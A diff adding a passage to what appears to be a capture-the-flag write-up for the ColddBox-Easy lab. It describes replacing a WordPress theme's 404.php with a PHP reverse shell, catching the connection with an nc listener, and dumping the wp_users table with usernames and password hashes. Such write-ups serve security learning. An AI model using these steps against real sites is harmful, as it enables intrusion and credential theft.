@@ -120,3 +120,35 @@ Interesting Finding(s):
  | Username: C0ldd, Password: 9876543210
 
 ```
+
+Login as C0ldd, go to editor and find 404.php. Replace page contents with php reverse shell, save and update the page, then access it with `10.10.10.86/?p=404.php`.
+
+```
+└─$ nc -nvlp 1111
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1111
+Ncat: Listening on 0.0.0.0:1111
+Ncat: Connection from 10.10.10.86.
+Ncat: Connection from 10.10.10.86:40544.
+Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 23:14:23 up 14 min,  0 users,  load average: 0.00, 0.11, 0.22
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+```
+
+```
+MariaDB [colddbox]> select * from wp_users;
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email           | user_url | user_registered     | user_activation_key | user_status | display_name       |
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
+|  1 | c0ldd      | $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 | c0ldd         | c0ldd@localhost.com  |          | 2020-09-24 15:06:57 |                     |           0 | the cold in person |
+|  2 | hugo       | $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ | hugo          | hugo@localhost.com   |          | 2020-09-24 15:48:13 |                     |           0 | hugo               |
+|  4 | philip     | $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y. | philip        | philip@localhost.com |          | 2020-10-19 17:38:25 |                     |           0 | philip             |
++----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
+3 rows in set (0.00 sec)
+
+```
